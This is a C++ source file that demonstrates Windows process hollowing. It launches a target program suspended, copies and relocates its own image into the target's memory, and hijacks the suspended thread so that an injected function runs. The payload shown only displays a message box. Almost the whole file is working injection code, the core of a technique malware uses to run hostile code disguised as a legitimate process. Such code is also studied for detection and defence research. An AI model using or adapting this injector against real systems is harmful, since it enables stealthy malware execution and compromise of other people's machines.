/**
* Demonstrates process hollowing by injecting itself into a process that is created in a suspended state.
* Supports 32- and 64 Bit applications.
*
*/

#include <Windows.h>
#include <cstdio>
#include <cstdint>


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
);

using NtQueryInformationProcess = NTSTATUS(WINAPI*)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
);

void InjectedFunction()
{
	MessageBoxA(NULL, "Message from payload", "Injected payload", MB_OK);
}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe applicationPath\n");
		return 1;
	}

	char* applicationPath = argv[1];

	STARTUPINFOA startupInfo = STARTUPINFOA();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION();

	// create the process in a suspended state
	if (!CreateProcessA(0,
		applicationPath,
		0,
		0,
		0,
		CREATE_SUSPENDED,
		0,
		0,
		&startupInfo,
		&processInformation))
	{
		printf("[Error] %d - Failed to create process using application %s\n", GetLastError(), applicationPath);
		return 1;
	}

	HMODULE ntdllHandle = GetModuleHandleA("ntdll");
	//NtUnmapViewOfSection fnNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	//NtQueryInformationProcess fnNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(ntdllHandle, "NtQueryInformationProcess");


	// unmapping currently makes it unstable and is an optional step in process hollowing anyway
	// fnNtUnmapViewOfSection(processHandle, peb.ImageBaseAddress);

	// read PE header of payload (this process injects itself, alternatively an executable file from disc could be read)
	HMODULE baseAddress = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((int8_t*)baseAddress + dosHeader->e_lfanew);

	// create space for a copy of the image so we can relocate it locally and then write it to the target process
	int8_t* imageCopy = (int8_t*)malloc(ntHeader->OptionalHeader.SizeOfImage);
	if (!imageCopy)
	{
		printf("[Error] %d - Failed to allocate space for the PE header\n", GetLastError());
		return 1;
	}

	// create a copy of the image
	memcpy(imageCopy, baseAddress, ntHeader->OptionalHeader.SizeOfImage);

	// allocate remote memory
	LPVOID remoteMemory = VirtualAllocEx(processInformation.hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// calculate the difference between the original base address and the remote memory as we need to account for it when relocating
	int64_t baseAddressDelta = (int64_t)remoteMemory - (int64_t)baseAddress;

	printf("[Info] - Image baseAddress: %p, remoteAddress: %p, absoluteDelta: %llx\n", baseAddress, remoteMemory, abs(baseAddressDelta));

	// relocate the copy of the image
	PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(imageCopy + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	while (baseRelocation->SizeOfBlock > 0)
	{
		// calculate relocation entries in current block
		int numberOfEntries = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		PBASE_RELOCATION_ENTRY relocationEntry = (PBASE_RELOCATION_ENTRY)(baseRelocation + 1);

		// relocate entries of current block
		for (int i = 0; i < numberOfEntries; i++)
		{
			if (relocationEntry[i].Offset)
			{
				// correct relocation entry by adding the delta between the images
				int64_t* relocationEntryAddress = (int64_t*)(imageCopy + baseRelocation->VirtualAddress + relocationEntry[i].Offset);
				*relocationEntryAddress += baseAddressDelta;
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((int8_t*)baseRelocation + baseRelocation->SizeOfBlock);
	}

	printf("[Info] - Relocated image\n");

	// write relocated copy of image to remote memory
	if (!WriteProcessMemory(processInformation.hProcess, remoteMemory, imageCopy, ntHeader->OptionalHeader.SizeOfImage, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote relocated image to remote process\n");

	// execute the injected function
	int8_t* injectedFunctionRemoteAddress = (int8_t*)InjectedFunction + baseAddressDelta;

	printf("[Info] - Going to execute: %p using thread hijacking\n", injectedFunctionRemoteAddress);

	CONTEXT context = CONTEXT();
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed GetThreadContext\n", GetLastError());
		return 1;
	}

#ifdef _WIN64
	// for 32bit the address to be executed is in RCX when creating a suspended process
	// RIP did also work
	context.Rcx = (DWORD_PTR)injectedFunctionRemoteAddress;
#else
	// for 32bit the address to be executed is in EAX when creating a suspended process
	context.Eax = (DWORD_PTR)injectedFunctionRemoteAddress;
#endif

	if (!SetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed SetThreadContext\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resuming hijacked thread\n");

	if (!ResumeThread(processInformation.hThread))
	{
		printf("[Error] %d -  Failed ResumeThread\n", GetLastError());
		return 1;
	}

	return 0;
}